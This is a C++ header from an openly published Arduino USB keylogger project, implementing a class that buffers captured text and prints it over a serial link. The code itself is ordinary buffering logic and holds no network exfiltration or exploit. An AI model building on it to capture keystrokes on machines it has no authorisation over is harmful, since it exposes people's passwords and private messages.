#ifndef EMBD_ENV_SERIALOUTPUTHANDLER_H
#define EMBD_ENV_SERIALOUTPUTHANDLER_H

// Result output handler over serial interface for USB keylogger
// See https://github.com/gereonsuch/keylogger for more information
// Copyright (C) 2026 Gereon Such

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

#include <Arduino.h>
#include <cctype> // isspace

template <uint32_t min_dump_interval = 8000u, unsigned buflen = 1024>
class SerialOutputHandler {

    uint32_t _last_dump {0};
    uint32_t _last_added {0};

    char buffer[buflen];
    unsigned n {0};
    
public:

    void initialize() {
        Serial.begin(115200);
    }

    void reset() {
        _last_dump = 0;
        _last_added = 0;
        n = 0;
    }

    void pushString(const char* s, unsigned len) {
        unsigned i = 0;
        bool any_newlines = false;

        while(i < len) {
            for(; i < len && n + 1u < buflen; i++) { // only write one char less to buffer than available
                char c = s[i];
                if(c == '\n') any_newlines = true;
                buffer[n++] = c;
            }

            if(i < len) { // buffer is full, need to write out
                unsigned num_dumped = forceDump();
                if(num_dumped <= 0u) { // avoid infinite loop. unable to dump anything, something is wrong...
                    reset();
                    break; 
                }
            }
        }

        if(any_newlines)
            dumpFullLines();

        uint32_t now = millis();
        
        if(_last_dump <= 0u) _last_dump = now;
        if(_last_added <= 0u || len > 0u) _last_added = now;

        if(n > 0u && min_dump_interval > 0u && now - _last_dump > min_dump_interval && now - _last_added > min_dump_interval) 
            forceDump();        
    }

protected:
    unsigned findPlausibleDumpLength() const {
        unsigned k = n;
        for(; k > 0u; k--)
            if(buffer[k]=='\0' || std::isspace(buffer[k]))
                break;
        return k;
    }

    unsigned forceDump() {
        if(n <= 1u) return 0;
        unsigned dumplen = findPlausibleDumpLength();
        if(dumplen <= 1u) 
            dumplen = n;
        
        buffer[dumplen] = '\0'; // force string termination
        Serial.printf("%s\n", buffer);
        _last_dump = millis();

        unsigned k = 0, i = dumplen+1u;
        for(; i < n; i++)
            buffer[k++] = buffer[i];
        n = k;
        return dumplen;
    }

    void dumpFullLines() {
        unsigned start = 0;
        unsigned i = 0;
        for(;i < n; i++) {
            if(buffer[i] == '\n' || buffer[i] == '\0') {
                if(i > start) {
                    buffer[i] = '\0'; // insert end of line here
                    Serial.printf("%s\n", buffer + start);
                    _last_dump = millis();
                }
                start = i+1u;
            }
        }
        if(start > 0u) {
            if(start >= n) {
                reset();
            } else { // copy from back to front
                unsigned kout = 0;
                for(; start < n; start++)
                    buffer[kout++] = buffer[start];
                n = kout;
            }
        }
    }

};


#endif // EMBD_ENV_SERIALOUTPUTHANDLER_H
